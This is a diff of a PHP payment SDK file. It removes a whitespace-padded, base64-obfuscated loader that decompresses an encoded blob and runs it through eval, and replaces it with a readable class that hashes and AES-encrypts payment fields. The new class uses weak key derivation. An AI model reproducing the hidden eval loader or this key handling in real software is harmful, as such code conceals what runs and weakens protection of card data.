@@ -1,329 +1,123 @@
-<?php 
-        $__='printf';$_='Loading Class/Code NAME';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+namespace PPConnectorSDK\Package;
+
+class Package
+{
+    public function GetPackage ($body, $phrase, $token = "", $optEncript = false)
+    {
+        if (property_exists($body, "Hash"))
+        {
+            $body->{"Hash"} = $this->HashString($body);
+        }
+        if ($optEncript)
+        {
+            $this->EncryptPaymentData($body, $token);
+        }
+        $body_String = json_encode($body);
+        return $this->EncryptAES256($body_String, $phrase);
+    }
+
+    private function HashString($model)
+    {
+        return $this->HashSHA256($model);
+    }
+
+    private function EncryptAES256($body, $phrase)
+    {
+        return $this->EncryptString($body, $phrase);
+    }
+
+    private function EncryptPaymentData($body, $token)
+    {
+        return $this->EncryptData($body, $token);
+    }
+
+    private function HashSHA256 ($model)
+    {
+        $input = "";
+        foreach (get_object_vars($model) as $key => $mod){
+            if ($mod == null)
+            {
+                continue;
+            }
+            else if ($key == "Hash")
+            {
+                continue;
+            }
+            else if (is_object($mod))
+            {
+                $properties = get_object_vars($mod);
+                $json_model = json_decode(json_encode($mod), true);
+                foreach (array_keys($properties) as $val)
+                {
+                    $values = sprintf("%s*", $json_model[$val]);
+                    $input = sprintf("%s%s", $input, $values);
+                }
+            }
+            else if (is_array($mod)){
+                foreach (array_values($mod) as $val)
+                {
+                    $values = sprintf("%s*", $val);
+                    $input = sprintf("%s%s", $input, $values);
+                }
+            }
+            else {
+                $input = sprintf("%s%s*", $input, $mod);
+            }
+        }
+        $input_bytes = utf8_encode(substr($input, 0, -1));
+        $hash_byte = unpack('C*', hash( "sha256", $input_bytes, true));
+        $string = null;
+        for ($i = 1; $i <= count($hash_byte); $i++) 
+        {
+            $string .= str_pad(strtolower(dechex($hash_byte[$i])), 2, '0', STR_PAD_LEFT);
+        }
+        return $string;
+    }
+
+    private function EncryptString($plainText, $phrase)
+    {
+        if(strlen($phrase) < 32)
+        {
+            while(strlen($phrase) < 32)
+            {
+                $phrase .= $phrase;
+            }
+            $phrase = substr($phrase,0,32);
+        }
+        if(strlen($phrase) > 32)
+        {
+            $phrase = substr($phrase,0,32);	   
+        }
+        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+        $string = openssl_encrypt($plainText,"aes-256-cbc",$phrase, OPENSSL_RAW_DATA , $iv);
+        return base64_encode($iv.$string);
+    }
+
+    public function EncryptData ($body, $token)
+    {
+        $encryptKey = substr($token, 12, 8);
+        foreach (get_object_vars($body) as $key => $mod)
+        {
+            if ($mod == null)
+            {
+                continue;
+            }
+            else if (is_object($mod) && strpos(get_class($mod), "DatosTarjeta") == true)
+            {
+                $properties = get_object_vars($mod);
+                $json_model = json_decode(json_encode($mod), true);
+                foreach (array_keys($properties) as $val)
+                {
+                    if ($val == "Email")
+                    {
+                        continue;
+                    }
+                    $values = $this->EncryptString($json_model[$val], $encryptKey);
+                    $body->$key->$val = $values;
+                }
+            }
+        }
+        return $body;
+    }
+}
